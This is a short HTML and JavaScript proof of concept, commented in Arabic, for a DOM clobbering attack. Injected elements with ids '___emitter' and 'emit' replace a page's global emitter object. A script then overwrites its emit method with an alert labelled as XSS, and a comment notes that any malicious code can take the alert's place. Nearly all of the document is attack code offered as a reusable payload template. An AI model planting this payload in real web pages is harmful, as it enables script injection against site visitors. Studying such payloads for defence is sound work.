<!-- هجوم DOM Clobbering لاستبدال window.___emitter -->
<div id="___emitter">
  <a id="emit"></a>
</div>

<script>
  // بعد تحميل الصفحة، يمكن استغلال المتغير المغلوط
  setTimeout(() => {
    // window.___emitter أصبح الآن عنصر DOM بدلاً من الكائن الأصلي
    if (window.___emitter && window.___emitter.emit) {
      // تنفيذ كود خبيث عند استدعاء emit
      window.___emitter.emit = function(event, data) {
        alert('XSS via DOM Clobbering!');
        // يمكن استبدال هذا بأي كود خبيث
      };
    }
  }, 1000);
</script>
